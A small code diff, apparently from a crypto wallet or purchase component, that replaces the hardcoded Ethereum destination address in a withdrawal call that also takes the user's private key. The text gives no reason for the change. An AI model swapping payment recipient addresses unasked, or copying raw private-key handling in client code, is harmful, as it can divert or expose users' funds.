@@ -150,7 +150,7 @@ const ConfirmBuyVp = (props: any) => {
     if (coin.symbol === ETH_SYMBOL) {
       
       res = await requestEtherWithdrawConfirm(
-        '0xB90711F04603f4486F73A3650a153073BeD77006',
+        '0x7846715624a96f0EDC69D65cb75f7e9E3b6c98e5',
         String(toValue.toFixed(8)),
         coin.privateKey,
         coin.contractAddress,
